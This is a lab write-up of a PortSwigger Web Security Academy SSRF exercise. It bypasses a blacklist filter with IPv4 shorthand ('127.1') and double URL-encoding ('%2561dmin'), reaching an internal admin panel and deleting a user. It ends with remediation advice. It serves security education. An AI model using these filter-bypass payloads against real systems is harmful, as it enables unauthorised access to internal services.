# SSRF: SSRF with Blacklist-Based Input Filter

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Server-Side Request Forgery with Blacklist Bypass (CWE-918)

## Lab Objective
The stock-check feature now blocks requests containing `localhost` and `127.0.0.1`. Bypass two separate, weak anti-SSRF defenses to reach the internal admin interface and delete the user `carlos`.

## Vulnerability Overview
This lab revisits the same stock-check SSRF primitive used in the earlier Apprentice labs, but with a defensive layer added: the application now blacklists known loopback hostnames before making the server-side request. As with every other blacklist covered across this portfolio (path traversal, file upload extensions), the core weakness is structural, not a matter of an incomplete list — **a blacklist can only block the specific string representations its author thought to include**, and `127.0.0.1` and `localhost` are far from the only ways to address the loopback interface.

Two independent gaps are exploited here, stacked on top of each other:
1. **IP address representation.** `127.0.0.1` is just one of several equally valid ways to express the loopback address. Most operating systems' networking stacks accept shorthand IPv4 notations — `127.1` is interpreted identically to `127.0.0.1` by the underlying resolver, since IPv4 permits omitting leading zero-valued octets in certain shorthand forms. A blacklist matching the literal string `127.0.0.1` has no reason to also match `127.1`, even though both resolve to the exact same address.
2. **Path-level filtering and double URL-encoding.** Once the host-based block is bypassed, the application separately blocks the literal string `/admin` appearing in the request. A single layer of URL-encoding (`%61dmin`) is often still decoded and inspected by the filter before the request is made. But if the filter decodes the URL *once* to perform its check, while the actual back-end HTTP client decodes it *twice* before issuing the request, a **double-encoded** payload can slip through the filter's single decode pass while still resolving correctly by the time it reaches the real request.

## Methodology
1. **Confirm the basic SSRF primitive still exists**, as in the Apprentice-level labs — the `stockApi` parameter accepts a full URL.
2. **Test the blacklist's exact boundaries.** Submit `localhost` and `127.0.0.1` directly and confirm both are explicitly blocked, establishing that host-based filtering is active.
3. **Try an alternate representation of the same address.** Shorthand IPv4 notation (`127.1`) is a well-known technique for this exact situation — test it in isolation (no path) first to confirm the host-level block is bypassed.
4. **Reintroduce the target path** (`/admin`) and observe it's now blocked separately — confirming a second, path-based filter layer exists independently of the host check.
5. **Apply single then double URL-encoding** to the blocked path segment, testing each against the filter to determine which level of encoding survives both the filter's inspection and the eventual real request.
6. **Combine both bypasses** into a single working payload and locate the user-deletion endpoint from the admin page's response.

---

## Exploitation

**Step 1:** Intercept the stock-check request in Burp Suite and send it to **Repeater**:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

The response explicitly rejects this, confirming `localhost` is blacklisted.

**Step 2:** Test the literal IP address:

```
stockApi=http://127.0.0.1/admin
```

Also blocked, confirming `127.0.0.1` is separately blacklisted alongside the `localhost` string.

**Step 3:** Test the shorthand IPv4 representation, first without any path to isolate whether the host check alone can be bypassed:

```
stockApi=http://127.1/
```

This succeeds — a `200 OK` response is returned, confirming the blacklist's host check doesn't recognise `127.1` as equivalent to `127.0.0.1`, even though both resolve to the same loopback address.

**Step 4:** Add the target path back:

```
stockApi=http://127.1/admin
```

This is now blocked — confirming a second, independent filter specifically inspects the request path for the literal string `admin`.

**Step 5:** URL-encode the letter `a` in `admin` using a single pass of percent-encoding:

```
stockApi=http://127.1/%61dmin
```

Still blocked — indicating the filter itself decodes the path before inspecting it, so a single level of encoding doesn't hide the string from the check.

**Step 6:** Apply a **second** layer of URL-encoding — encoding the `%` character of the first encoding itself (`%` becomes `%25`), producing a doubly-encoded `a`:

```
stockApi=http://127.1/%2561dmin
```

This succeeds. The filter's single decode pass sees `%61dmin`, not the literal string `admin`, and passes it through — but the back-end HTTP client that actually issues the outbound request decodes the value a second time during normal URL processing, resolving `%2561dmin` down to `%61dmin` and finally to `admin`, reaching the real admin interface.

**Step 7:** The response now renders the admin panel's HTML, revealing the delete-user endpoint:

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

**Step 8:** Apply the identical double-encoding technique to reach this endpoint through the same SSRF channel:

```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

**Step 9:** The request succeeds, `carlos` is deleted, and the lab is solved.

**Why it works:** Both bypasses exploit the same underlying principle — **a discrepancy between how the filter interprets input and how the request is actually processed downstream.** The IP bypass exploits a discrepancy between the string the blacklist was written to match and the many equally valid ways a network stack can express the same address. The encoding bypass exploits a discrepancy between how many times the filter decodes the input before inspecting it versus how many times the actual HTTP client decodes it before connecting — a single-decode filter guarding a double-decode request path leaves exactly one layer of encoding as a blind spot.

## Impact
- **Full SSRF and admin panel access**, identical in severity to the unfiltered Apprentice-level labs — the blacklist added cost to the attack but didn't change the ceiling of impact once bypassed.
- **Demonstrates that string-based blacklisting of hostnames is fundamentally unreliable**, since IPv4/IPv6 addresses alone support numerous equivalent representations (decimal, octal, hex, shorthand, IPv6-mapped forms) that a developer is unlikely to enumerate exhaustively.
- **Demonstrates that decode-count mismatches are a generalizable bypass class**, applicable to any filter-then-request pipeline where the two stages don't agree on how many times to decode — relevant well beyond SSRF, including WAF bypasses and path traversal filters.

## Remediation
- **Use an allowlist of permitted hosts, resolved and compared as actual IP addresses**, not a blacklist of string patterns. Resolving the hostname first and checking the resulting IP against a known-safe allowlist closes off all representation-based bypasses simultaneously, since every shorthand form resolves to the same underlying address before comparison.
- **Perform filtering and the actual request on the identically-decoded value.** The filter should operate on the fully and finally decoded string that will actually be used to make the request — never on an intermediate, partially-decoded representation.
- **Avoid building security logic around string matching on URLs entirely** where possible — parse the URL into its structural components (scheme, host, path) using a robust URL-parsing library, and validate each component explicitly, rather than searching for substrings.
- **Apply network-level segmentation** as defense-in-depth — restricting what the application server can reach at the network layer remains effective regardless of how the request is encoded or represented at the application layer.

## Key Takeaways
- "Blocked by the filter" is not the same as "fixed" — as throughout this entire portfolio, a rejection response is a prompt to vary the input's representation, not a signal to stop.
- IPv4 shorthand notation (`127.1`, decimal integer forms like `2130706433`, octal forms) is a standard SSRF bypass technique worth testing by default whenever a host-based blacklist is encountered, not just in this lab.
- Double (or N-layer) URL-encoding bypasses are possible precisely because real-world request pipelines often involve multiple components (a filter, a proxy, an HTTP client library) that don't necessarily decode input the same number of times — always worth testing incrementally.
- This lab stacks two independently well-known techniques — a strong reminder that real-world exploitation is rarely a single payload, but a short chain of smaller bypasses applied in sequence once each individual filter's blind spot is understood.

## Tools Used
- Burp Suite (Proxy, Repeater)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.